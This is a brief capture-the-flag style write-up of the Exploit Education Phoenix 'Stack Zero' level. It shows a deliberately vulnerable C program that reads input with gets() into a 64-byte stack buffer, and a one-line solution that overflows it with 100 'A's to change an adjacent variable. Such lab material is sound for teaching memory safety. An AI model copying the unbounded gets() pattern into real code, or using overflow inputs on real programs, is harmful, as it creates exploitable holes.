Stack Zero
This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  printf("%s\n", BANNER);

  locals.changeme = 0;
  gets(locals.buffer);

  if (locals.changeme != 0) {
    puts("Well done, the 'changeme' variable has been changed!");
  } else {
    puts(
        "Uh oh, 'changeme' has not yet been changed. Would you like to try "
        "again?");
  }

  exit(0);
}

The code uses gets function which can take input more than buffer length, hence the exploit :)

This level only asks to change the value of changeme to any value other than zero so we can just enter any random input that exceeds the buffer length to overwrite the value of changeme.

Solution:
$ python -c "print 'A'*100" | /opt/phoenix/amd64/stack-zero

Well done, the 'changeme' variable has been changed!
